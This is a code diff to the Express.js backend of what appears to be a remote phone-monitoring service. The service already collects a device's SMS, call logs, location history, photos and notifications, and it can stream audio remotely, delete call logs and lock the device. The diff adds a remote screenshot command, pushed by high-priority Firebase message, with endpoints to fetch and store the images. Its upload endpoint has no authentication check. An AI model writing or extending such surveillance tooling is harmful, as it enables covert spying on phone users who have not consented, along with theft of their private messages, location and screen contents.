@@ -1,5 +1,5 @@
 const express = require('express');
-const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS } = require('../models');
+const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, Screenshot } = require('../models');
 const { protect } = require('./auth');
 const admin = require('firebase-admin');
 
@@ -230,6 +230,8 @@ router.post('/:deviceId/command', protect, async (req, res) => {
       'start_webrtc_audio',
       'stop_webrtc_audio',
       'switch_camera',
+      // Screenshot capture
+      'capture_screenshot',
       'sync_data',
       'delete_call_logs',
       'lock_device',
@@ -897,6 +899,135 @@ router.post('/:deviceId/sms/sync', protect, async (req, res) => {
   } catch (error) {
     console.error('Failed to request SMS sync:', error);
     res.status(500).json({ error: 'Failed to send sync request' });
+  }
+});
+
+// ============ SCREENSHOT ENDPOINTS ============
+
+// Get latest screenshot for a device
+router.get('/:deviceId/screenshot', protect, async (req, res) => {
+  try {
+    const deviceIdParam = req.params.deviceId;
+
+    // Find device
+    let device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
+    }
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    // Get latest screenshot
+    const screenshot = await Screenshot.findOne({ deviceId: device.deviceId })
+      .sort({ capturedAt: -1 });
+
+    if (!screenshot) {
+      return res.status(404).json({ error: 'No screenshot available', hint: 'Request a screenshot first' });
+    }
+
+    res.json({
+      success: true,
+      screenshot: {
+        id: screenshot._id.toString(),
+        imageData: screenshot.imageData,
+        width: screenshot.width,
+        height: screenshot.height,
+        capturedAt: screenshot.capturedAt
+      }
+    });
+  } catch (error) {
+    console.error('Failed to get screenshot:', error);
+    res.status(500).json({ error: 'Failed to get screenshot' });
+  }
+});
+
+// Request screenshot capture from device
+router.post('/:deviceId/screenshot/capture', protect, async (req, res) => {
+  try {
+    const deviceIdParam = req.params.deviceId;
+
+    // Find device
+    let device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
+    }
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    if (!device.fcmToken) {
+      return res.status(400).json({ error: 'Device not connected' });
+    }
+
+    if (!admin.apps.length) {
+      return res.status(503).json({ error: 'Push notifications not configured' });
+    }
+
+    await admin.messaging().send({
+      token: device.fcmToken,
+      data: {
+        command: 'capture_screenshot',
+        timestamp: Date.now().toString()
+      },
+      android: { 
+        priority: 'high',
+        directBootOk: true
+      }
+    });
+
+    res.json({
+      success: true,
+      message: 'Screenshot capture request sent to device'
+    });
+  } catch (error) {
+    console.error('Failed to request screenshot:', error);
+    res.status(500).json({ error: 'Failed to send screenshot request' });
+  }
+});
+
+// Upload screenshot from device (called by Android app)
+router.post('/:deviceId/screenshot/upload', async (req, res) => {
+  try {
+    const deviceIdParam = req.params.deviceId;
+    const { imageData, width, height } = req.body;
+
+    if (!imageData) {
+      return res.status(400).json({ error: 'Image data is required' });
+    }
+
+    // Find device by deviceId
+    const device = await Device.findOne({ deviceId: deviceIdParam });
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    // Delete old screenshots for this device (keep only latest)
+    await Screenshot.deleteMany({ deviceId: device.deviceId });
+
+    // Save new screenshot
+    const screenshot = new Screenshot({
+      deviceId: device.deviceId,
+      imageData,
+      width: width || 0,
+      height: height || 0,
+      capturedAt: new Date()
+    });
+
+    await screenshot.save();
+
+    console.log(`Screenshot saved for device ${device.deviceId}`);
+
+    res.json({
+      success: true,
+      message: 'Screenshot uploaded successfully',
+      screenshotId: screenshot._id.toString()
+    });
+  } catch (error) {
+    console.error('Failed to upload screenshot:', error);
+    res.status(500).json({ error: 'Failed to upload screenshot' });
   }
 });
 
